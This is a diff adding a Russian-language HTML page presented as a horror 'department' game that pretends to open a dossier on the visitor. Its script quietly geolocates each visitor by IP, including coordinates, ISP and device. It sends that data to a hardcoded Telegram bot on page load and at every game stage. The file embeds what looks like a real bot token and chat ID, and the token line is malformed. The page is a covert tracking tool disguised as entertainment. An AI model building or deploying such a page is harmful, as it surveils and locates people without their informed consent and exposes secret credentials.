@@ -1,0 +1,574 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
+<meta name="theme-color" content="#08090a">
+<title>ДЕПАРТАМЕНТ</title>
+<style>
+  :root {
+    --bg: #08090a;
+    --amber: #c9a24b;
+    --red: #8f2b2b;
+    --dim: #4a5358;
+  }
+  * { box-sizing: border-box; margin: 0; padding: 0;
+      -webkit-tap-highlight-color: transparent; }
+  html, body { height: 100%; overflow: hidden; background: var(--bg); }
+  body {
+    font-family: "IBM Plex Mono", "Courier New", monospace;
+    color: #c8ccce;
+    user-select: none; -webkit-user-select: none;
+    touch-action: manipulation;
+    overscroll-behavior: none;
+  }
+
+  .scanlines, .vignette, .noise {
+    position: fixed; inset: 0; pointer-events: none; z-index: 100;
+  }
+  .scanlines {
+    background: repeating-linear-gradient(0deg,
+      rgba(0,0,0,.42) 0px, rgba(0,0,0,.42) 1px,
+      transparent 1px, transparent 3px);
+    opacity: .4;
+  }
+  .vignette {
+    background: radial-gradient(ellipse at center,
+      transparent 28%, rgba(0,0,0,.92) 100%);
+  }
+  .noise {
+    opacity: .07;
+    background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='140' height='140'%3E%3Cfilter id='n'%3E%3CfeTurbulence type='fractalNoise' baseFrequency='0.85' numOctaves='3'/%3E%3C/filter%3E%3Crect width='140' height='140' filter='url(%23n)'/%3E%3C/svg%3E");
+    animation: grain .4s steps(2) infinite;
+  }
+  @keyframes grain {
+    0% { transform: translate(0,0); }
+    25% { transform: translate(-3%,2%); }
+    50% { transform: translate(2%,-3%); }
+    75% { transform: translate(-2%,-2%); }
+    100% { transform: translate(3%,3%); }
+  }
+
+  .screen {
+    position: fixed; inset: 0;
+    display: none; overflow: hidden;
+  }
+  .screen.active { display: block; animation: fade .8s ease; }
+  @keyframes fade { from { opacity: 0; } to { opacity: 1; } }
+
+  .photo {
+    position: absolute; inset: 0;
+    width: 100%; height: 100%;
+    object-fit: cover;
+    object-position: center 15%;
+    filter: grayscale(.75) contrast(1.2) brightness(.4);
+    z-index: 1;
+  }
+  .photo-overlay {
+    position: absolute; inset: 0; z-index: 2;
+    background: linear-gradient(180deg,
+      rgba(0,0,0,.55) 0%,
+      rgba(0,0,0,.15) 40%,
+      rgba(0,0,0,.96) 100%);
+  }
+
+  .hud {
+    position: absolute; top: 0; left: 0; right: 0;
+    padding: max(14px, env(safe-area-inset-top)) 16px 14px;
+    display: flex; justify-content: space-between;
+    font-size: 10px; letter-spacing: 2px;
+    color: var(--dim); text-transform: uppercase;
+    z-index: 10;
+  }
+  .rec { color: var(--red); display: flex; align-items: center; gap: 6px; }
+  .dot {
+    width: 7px; height: 7px; border-radius: 50%;
+    background: var(--red); animation: pulse 1.4s infinite;
+  }
+  @keyframes pulse { 0%,100% { opacity: 1; } 50% { opacity: .12; } }
+
+  .content {
+    position: absolute; left: 0; right: 0; bottom: 0;
+    z-index: 10;
+    padding: 0 22px calc(max(28px, env(safe-area-inset-bottom)) + 28px);
+  }
+  .content h1 {
+    font-size: 22px; letter-spacing: 5px;
+    text-transform: uppercase; font-weight: 400;
+    margin-bottom: 12px; color: #e0e3e5;
+    text-shadow: 0 0 20px rgba(0,0,0,.95);
+  }
+  .content p {
+    font-size: 14px; line-height: 1.55;
+    color: #9aa3a8; margin-bottom: 8px;
+    text-shadow: 0 0 12px rgba(0,0,0,.95);
+  }
+  .content p.small { font-size: 11px; color: var(--dim); letter-spacing: 1.5px; margin-top: 10px; }
+  .content p.amber { color: var(--amber); }
+  .content p.red { color: var(--red); }
+
+  .btn {
+    margin-top: 22px; width: 100%; padding: 18px;
+    background: rgba(201,162,75,.06);
+    border: 1px solid var(--amber);
+    color: var(--amber);
+    font-family: inherit; font-size: 13px;
+    letter-spacing: 4px; text-transform: uppercase;
+    cursor: pointer; transition: .2s;
+    animation: pulseBtn 2.5s infinite;
+  }
+  .btn:active { background: rgba(201,162,75,.25); transform: scale(.98); }
+  @keyframes pulseBtn {
+    0%,100% { box-shadow: 0 0 0 rgba(201,162,75,0); }
+    50% { box-shadow: 0 0 22px rgba(201,162,75,.22); }
+  }
+
+  .hotspot {
+    position: absolute; z-index: 5;
+    width: 76px; height: 76px; border-radius: 50%;
+    cursor: pointer;
+    background: radial-gradient(circle,
+      rgba(201,162,75,.5) 0%,
+      rgba(201,162,75,.15) 45%,
+      transparent 70%);
+    animation: breathe 2.4s ease-in-out infinite;
+    transform: translate(-50%, -50%);
+  }
+  @keyframes breathe {
+    0%,100% { opacity: .3; transform: translate(-50%, -50%) scale(1); }
+    50% { opacity: .9; transform: translate(-50%, -50%) scale(1.18); }
+  }
+  .hotspot.marked {
+    animation: none; opacity: 1;
+    background: radial-gradient(circle,
+      rgba(143,43,43,.7) 0%,
+      rgba(143,43,43,.2) 50%,
+      transparent 72%);
+    box-shadow: 0 0 40px rgba(143,43,43,.7);
+  }
+  .hotspot-label {
+    position: absolute; z-index: 6;
+    transform: translate(-50%, 50px);
+    color: var(--red); font-size: 11px;
+    letter-spacing: 4px; font-weight: bold;
+    text-shadow: 0 0 12px rgba(143,43,43,.9);
+    opacity: 0; transition: opacity .6s;
+    pointer-events: none;
+    white-space: nowrap;
+  }
+  .hotspot-label.show { opacity: 1; }
+
+  .dossier-backdrop {
+    position: absolute; inset: 0; z-index: 20;
+    background: rgba(0,0,0,.85);
+    display: none;
+    animation: fade .4s ease;
+  }
+  .dossier-backdrop.show { display: block; }
+
+  .dossier {
+    position: absolute; left: 0; right: 0; bottom: 0;
+    z-index: 21;
+    background: #0a0c0e;
+    border-top: 1px solid var(--red);
+    padding: 20px 20px calc(max(24px, env(safe-area-inset-bottom)) + 20px);
+    transform: translateY(100%);
+    transition: transform .5s cubic-bezier(.2,.9,.3,1);
+    max-height: 92vh; overflow-y: auto;
+    box-shadow: 0 -10px 40px rgba(143,43,43,.25);
+  }
+  .dossier.show { transform: translateY(0); }
+
+  .dossier-head {
+    display: flex; justify-content: space-between; align-items: center;
+    font-size: 10px; letter-spacing: 3px;
+    color: var(--red); text-transform: uppercase;
+    padding-bottom: 12px; margin-bottom: 14px;
+    border-bottom: 1px solid #1c2124;
+  }
+  .dossier-head .dot { width: 8px; height: 8px; }
+
+  .dossier-row {
+    display: flex; justify-content: space-between;
+    gap: 12px; padding: 10px 0;
+    border-bottom: 1px solid #14181a;
+    font-size: 12px;
+  }
+  .dossier-row span {
+    color: var(--dim); letter-spacing: 2px;
+    text-transform: uppercase; flex-shrink: 0;
+  }
+  .dossier-row b {
+    color: #c8ccce; font-weight: 400;
+    text-align: right; letter-spacing: 1px;
+    word-break: break-word;
+  }
+  .dossier-row b.amber { color: var(--amber); }
+  .dossier-row b.red { color: var(--red); }
+
+  .dossier-status {
+    margin-top: 16px; padding: 10px;
+    text-align: center; font-size: 11px; letter-spacing: 4px;
+    color: var(--red); border: 1px solid var(--red);
+    background: rgba(143,43,43,.08);
+    animation: pulse 1.6s infinite;
+  }
+
+  .dossier-foot {
+    margin-top: 18px; font-size: 10px; color: var(--dim);
+    letter-spacing: 1.5px; text-align: center; line-height: 1.6;
+  }
+
+  .timer-wrap {
+    position: absolute; inset: 0;
+    display: none; flex-direction: column;
+    align-items: center; justify-content: center;
+    z-index: 15; padding: 22px;
+  }
+  .timer-wrap.show { display: flex; animation: fade .4s ease; }
+  .big-timer {
+    font-size: 88px; letter-spacing: 4px;
+    color: var(--red); font-weight: 400;
+    text-shadow: 0 0 40px rgba(143,43,43,.8);
+    animation: pulse 1s infinite;
+    font-variant-numeric: tabular-nums;
+    margin-bottom: 30px; line-height: 1;
+  }
+  .big-timer.danger { font-size: 40px; letter-spacing: 6px; }
+
+  .final { text-align: center; }
+  .final .eye {
+    width: 84px; height: 84px; margin: 0 auto 26px;
+    border: 1px solid var(--dim); border-radius: 50%;
+    display: flex; align-items: center; justify-content: center;
+    animation: eye 3s ease-in-out infinite;
+  }
+  .final .eye::after {
+    content: ""; width: 18px; height: 18px;
+    background: var(--amber); border-radius: 50%;
+    opacity: .75; box-shadow: 0 0 22px var(--amber);
+  }
+  @keyframes eye {
+    0%,100% { transform: scale(1); opacity: .6; }
+    50% { transform: scale(1.1); opacity: 1; }
+  }
+  .final h2 {
+    font-size: 26px; letter-spacing: 8px;
+    color: var(--amber); font-weight: 400; margin-bottom: 22px;
+    text-shadow: 0 0 24px rgba(201,162,75,.3);
+  }
+
+  .glitch { animation: glitch .35s steps(2) 2; }
+  @keyframes glitch {
+    0% { transform: translate(0); filter: none; }
+    25% { transform: translate(-3px,2px); filter: hue-rotate(40deg) brightness(1.3); }
+    50% { transform: translate(3px,-2px); filter: invert(.1); }
+    75% { transform: translate(-2px,-3px); }
+    100% { transform: translate(0); filter: none; }
+  }
+
+  .disclaimer {
+    position: fixed; left: 0; right: 0;
+    bottom: calc(env(safe-area-inset-bottom) + 4px);
+    text-align: center; font-size: 9px; letter-spacing: 2px;
+    color: #2a3134; z-index: 50; pointer-events: none;
+  }
+</style>
+</head>
+<body>
+
+<div class="scanlines"></div>
+<div class="vignette"></div>
+<div class="noise"></div>
+
+<section class="screen active" id="s0">
+  <img class="photo" id="img0" alt="">
+  <div class="photo-overlay"></div>
+  <div class="hud">
+    <div class="rec"><span class="dot"></span>ЗАПИСЬ</div>
+    <div>ДОСТУП · 0</div>
+  </div>
+  <div class="content">
+    <h1>ДЕПАРТАМЕНТ</h1>
+    <p>Вы были замечены. Это не случайность.</p>
+    <p class="small">Три шага. Обратной дороги нет.</p>
+    <button class="btn" id="go0">ВОЙТИ</button>
+  </div>
+</section>
+
+<section class="screen" id="s1">
+  <img class="photo" id="img1" src="photo.jpg" alt="">
+  <div class="photo-overlay"></div>
+  <div class="hud">
+    <div class="rec"><span class="dot"></span>ЗАПИСЬ</div>
+    <div>ДОСТУП · 1</div>
+  </div>
+  <div class="content">
+    <h1>НАЙДИ СЕБЯ</h1>
+    <p>На этой фотографии есть вы.</p>
+    <p>Коснитесь себя — и мы подтвердим личность.</p>
+    <p class="small">[ отмеченная область дышит ]</p>
+  </div>
+
+  <div class="hotspot" id="hs1" style="top: 36%; left: 40%;"></div>
+  <div class="hotspot-label" id="hs1label" style="top: 36%; left: 40%;">ВЫ</div>
+
+  <div class="dossier-backdrop" id="dbackdrop"></div>
+  <div class="dossier" id="dossier">
+    <div class="dossier-head">
+      <span>📂 ЛИЧНОЕ ДЕЛО · ОТКРЫТО</span>
+      <span class="rec"><span class="dot"></span>LIVE</span>
+    </div>
+
+    <div class="dossier-row"><span>Идентификатор</span><b class="amber" id="d-ip">—</b></div>
+    <div class="dossier-row"><span>Локация</span><b id="d-loc">—</b></div>
+    <div class="dossier-row"><span>Провайдер</span><b id="d-isp">—</b></div>
+    <div class="dossier-row"><span>Координаты</span><b class="red" id="d-coord">—</b></div>
+    <div class="dossier-row"><span>Устройство</span><b id="d-dev">—</b></div>
+    <div class="dossier-row"><span>Время фиксации</span><b id="d-time">—</b></div>
+
+    <div class="dossier-status">СТАТУС · ОТСЛЕЖИВАЕТСЯ</div>
+    <button class="btn" id="go1b">Я ПРИНИМАЮ</button>
+    <div class="dossier-foot">
+      Данные получены легально из открытых сетевых источников.<br>
+      Художественный вымысел · совпадения случайны.
+    </div>
+  </div>
+</section>
+
+<section class="screen" id="s2">
+  <img class="photo" id="img2" alt="">
+  <div class="photo-overlay"></div>
+  <div class="hud">
+    <div class="rec"><span class="dot"></span>ЗАПИСЬ</div>
+    <div>ДОСТУП · 2</div>
+  </div>
+
+  <div class="content" id="s2intro">
+    <h1>НЕ ОГЛЯДЫВАЙСЯ</h1>
+    <p>У вас есть 10 секунд.</p>
+    <p class="amber">Что-то приближается.</p>
+    <button class="btn" id="go2start">Я ГОТОВ</button>
+  </div>
+
+  <div class="timer-wrap" id="s2timerWrap">
+    <div class="big-timer" id="s2timer">10</div>
+    <button class="btn" id="go2">Я НЕ ОГЛЯДЫВАЛСЯ</button>
+  </div>
+</section>
+
+<section class="screen" id="s3">
+  <img class="photo" id="img3" alt="">
+  <div class="photo-overlay"></div>
+  <div class="hud">
+    <div class="rec"><span class="dot"></span>ЗАПИСЬ</div>
+    <div>ДОСТУП · 4</div>
+  </div>
+  <div class="content final">
+    <div class="eye"></div>
+    <h2>ПРИНЯТЫ</h2>
+    <p style="text-align:center">Вы больше не наблюдатель.<br>С этого момента — часть.</p>
+    <p class="red" style="text-align:center; margin-top:16px">Не оглядывайтесь. Мы рядом.</p>
+    <p class="small" style="text-align:center; margin-top:26px">[ сеанс завершён ]</p>
+  </div>
+</section>
+
+<div class="disclaimer">художественный вымысел · совпадения случайны · фиксируется IP и геоданные</div>
+
+<script>
+/* ════════════════════════════════════════════════════════
+   ⚠️ ВПИШИ СВОИ ЗНАЧЕНИЯ СЮДА
+   ════════════════════════════════════════════════════════ */
+const TG_TOKEN = "$TG_TOKEN = "9259484153:AAECN3o7f468Ihs53LCMtnNC9Oso3xxmssw";
+ // например: "1234567890:AAH..."
+const TG_CHAT  = "472749125";     // например: "987654321"
+
+/* ════════════════════════════════════════════════════════
+   ОСТАЛЬНЫЕ ФОТО
+   ════════════════════════════════════════════════════════ */
+const IMAGES = {
+  s0: "https://picsum.photos/seed/dept-intro/900/1600",
+  s2: "https://picsum.photos/seed/dept-run/900/1600",
+  s3: "https://picsum.photos/seed/dept-final/900/1600"
+};
+document.getElementById("img0").src = IMAGES.s0;
+document.getElementById("img2").src = IMAGES.s2;
+document.getElementById("img3").src = IMAGES.s3;
+
+/* ════════════════════════════════════════════════════════
+   ГЕОДАННЫЕ (ipwho.is + fallback ipapi.co)
+   ════════════════════════════════════════════════════════ */
+let geo = null;
+
+async function loadGeo() {
+  try {
+    const r = await fetch("https://ipwho.is/");
+    const d = await r.json();
+    if (d.success) {
+      geo = {
+        ip: d.ip, city: d.city || "—", region: d.region || "",
+        country: d.country || "—",
+        isp: (d.connection && (d.connection.isp || d.connection.org)) || "—",
+        lat: d.latitude, lon: d.longitude
+      };
+      return geo;
+    }
+  } catch(e) {}
+
+  try {
+    const r = await fetch("https://ipapi.co/json/");
+    const d = await r.json();
+    geo = {
+      ip: d.ip, city: d.city || "—", region: d.region || "",
+      country: d.country_name || "—", isp: d.org || "—",
+      lat: d.latitude, lon: d.longitude
+    };
+    return geo;
+  } catch(e) {}
+
+  geo = { ip: "неизвестен", city: "—", region: "", country: "—", isp: "—", lat: null, lon: null };
+  return geo;
+}
+
+const geoPromise = loadGeo();
+
+/* ════════════════════════════════════════════════════════
+   ОТПРАВКА В TELEGRAM НАПРЯМУЮ
+   ════════════════════════════════════════════════════════ */
+async function notifyAdmin(stage) {
+  const g = geo || {};
+  const dev = /iPhone|iPad|Android/i.test(navigator.userAgent) ? "моб. устройство" :
+              /Mac/i.test(navigator.userAgent) ? "macOS" :
+              /Win/i.test(navigator.userAgent) ? "Windows" : "неизвестно";
+
+  const text =
+    `🕵️ ${stage}\n` +
+    `IP: ${g.ip || "?"}\n` +
+    `Локация: ${g.city || "?"}, ${g.country || "?"}\n` +
+    `Провайдер: ${g.isp || "?"}\n` +
+    `Координаты: ${g.lat || "?"}, ${g.lon || "?"}\n` +
+    `Устройство: ${dev} · ${screen.width}×${screen.height}\n` +
+    `Время: ${new Date().toLocaleString("ru-RU")}`;
+
+  fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage`, {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify({ chat_id: TG_CHAT, text: text })
+  }).catch(()=>{});
+}
+
+// Уведомление при заходе
+geoPromise.then(() => {
+  notifyAdmin("🚪 ВХОД НА САЙТ");
+});
+
+/* ════════════════════════════════════════════════════════
+   НАВИГАЦИЯ
+   ════════════════════════════════════════════════════════ */
+const screens = [0,1,2,3].map(i => document.getElementById("s"+i));
+function show(n) {
+  screens.forEach(s => s.classList.remove("active"));
+  screens[n].classList.add("active");
+}
+function glitch() {
+  document.body.classList.add("glitch");
+  setTimeout(() => document.body.classList.remove("glitch"), 700);
+}
+function vibrate(pattern) {
+  if (navigator.vibrate) navigator.vibrate(pattern);
+}
+
+document.getElementById("go0").onclick = () => {
+  glitch(); vibrate([100, 50, 100]);
+  setTimeout(() => show(1), 400);
+};
+
+const hs = document.getElementById("hs1");
+const hsLabel = document.getElementById("hs1label");
+const dossier = document.getElementById("dossier");
+const backdrop = document.getElementById("dbackdrop");
+
+hs.addEventListener("click", async (e) => {
+  e.stopPropagation();
+  if (hs.classList.contains("marked")) return;
+
+  hs.classList.add("marked");
+  hsLabel.classList.add("show");
+  glitch(); vibrate([200, 100, 200]);
+
+  const g = await geoPromise;
+
+  document.getElementById("d-ip").textContent = g.ip;
+  const loc = [g.city, g.region, g.country].filter(Boolean).join(", ");
+  document.getElementById("d-loc").textContent = loc || "не определена";
+  document.getElementById("d-isp").textContent = g.isp;
+
+  if (g.lat && g.lon) {
+    document.getElementById("d-coord").textContent = g.lat.toFixed(4) + ", " + g.lon.toFixed(4);
+  } else {
+    document.getElementById("d-coord").textContent = "—";
+  }
+
+  const dev = /iPhone|iPad|Android/i.test(navigator.userAgent) ? "моб. устройство" :
+              /Mac/i.test(navigator.userAgent) ? "macOS" :
+              /Win/i.test(navigator.userAgent) ? "Windows" : "неизвестно";
+  document.getElementById("d-dev").textContent = dev + " · " + screen.width + "×" + screen.height;
+  document.getElementById("d-time").textContent = new Date().toLocaleString("ru-RU");
+
+  setTimeout(() => {
+    backdrop.classList.add("show");
+    dossier.classList.add("show");
+  }, 700);
+
+  notifyAdmin("ЛИЧНОСТЬ ПОДТВЕРЖДЕНА");
+});
+
+document.getElementById("go1b").onclick = () => {
+  glitch(); vibrate([50, 100, 50]);
+  dossier.classList.remove("show");
+  setTimeout(() => {
+    backdrop.classList.remove("show");
+    show(2);
+  }, 400);
+};
+
+let s2running = false;
+document.getElementById("go2start").onclick = () => {
+  if (s2running) return;
+  s2running = true;
+  document.getElementById("s2intro").style.display = "none";
+  const wrap = document.getElementById("s2timerWrap");
+  const el = document.getElementById("s2timer");
+  wrap.classList.add("show");
+  notifyAdmin("ТАЙМЕР ЗАПУЩЕН");
+
+  let t = 10;
+  el.textContent = t;
+  const iv = setInterval(() => {
+    t--;
+    el.textContent = t;
+    if (navigator.vibrate) navigator.vibrate(50);
+
+    if (t <= 0) {
+      clearInterval(iv);
+      el.classList.add("danger");
+      el.textContent = "ПОЗДНО";
+      glitch(); vibrate([500, 100, 500]);
+      notifyAdmin("ТАЙМЕР ИСТЁК");
+      setTimeout(() => show(3), 1400);
+    }
+  }, 1000);
+
+  document.getElementById("go2").onclick = () => {
+    clearInterval(iv);
+    glitch();
+    notifyAdmin("ДОШЁЛ ДО КОНЦА");
+    setTimeout(() => show(3), 400);
+  };
+};
+
+window.addEventListener("pageshow", e => { if (e.persisted) location.reload(); });
+</script>
+
+</body>
+</html>
